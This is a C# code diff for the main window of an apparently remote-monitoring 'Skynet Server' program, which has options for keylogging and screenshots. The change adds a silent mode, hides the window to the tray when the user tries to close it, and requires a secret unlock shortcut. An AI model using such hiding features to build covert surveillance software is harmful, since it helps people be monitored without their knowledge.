@@ -7,13 +7,36 @@ namespace Skynet_Server
     public partial class MainForm : Form
     {
         private SkynetServer SkynetServer = new SkynetServer();
-        private SkynetServerSettings serverSettings = new SkynetServerSettings();
+        public SkynetServerSettings serverSettings = new SkynetServerSettings();
+        public bool RunSilence { get; internal set; }
+
         public MainForm()
         {
             Font = SystemFonts.MessageBoxFont;
             InitializeComponent();
+            unlockShortcutTextbox.Text = serverSettings.Keydata.ToString();
+            if(RunSilence)
+            {
+                this.Visible = false;
+                notifyIcon1.Icon = Properties.Resources.Favicon;
+                notifyIcon1.Text = "Skynet";
+                notifyIcon1.Visible = true;
+            }
         }
         void StartStopButtonClick(object sender, EventArgs e)
+        {
+            ToggleServer();
+        }
+
+        private void SetControlState(bool state)
+        {
+            allowKeylogging.Enabled = state;
+            allowScreenshots.Enabled = state;
+            portTextBox.Enabled = state;
+            unlockShortcutTextbox.Enabled = state;
+        }
+
+        public void ToggleServer()
         {
             if (!SkynetServer.ServerRunning)
             {
@@ -50,6 +73,7 @@ namespace Skynet_Server
                 startStopButton.Text = "Start";
             }
         }
+
         void AllowScreenshotsCheckedChanged(object sender, EventArgs e)
         {
             serverSettings.AllowScreenshots = allowScreenshots.Checked;
@@ -76,6 +100,31 @@ namespace Skynet_Server
             }
             else
                 Environment.Exit(0);
+        }
+
+        private void unlockShortcutTextbox_KeyDown(object sender, KeyEventArgs e)
+        {
+            if(unlockShortcutTextbox.Focused)
+            {
+                unlockShortcutTextbox.Text = e.KeyData.ToString();
+                serverSettings.Keydata = e.KeyData;
+            }
+        }
+
+        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            notifyIcon1.Icon = Skynet_Server.Properties.Resources.Favicon;
+            notifyIcon1.Visible = true;
+            notifyIcon1.Text = "Skynet";
+
+            e.Cancel = true;
+            this.Visible = false;
+        }
+
+        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
+        {
+            UnlockForm f = new UnlockForm(this);
+            f.ShowDialog();
         }
     }
 }
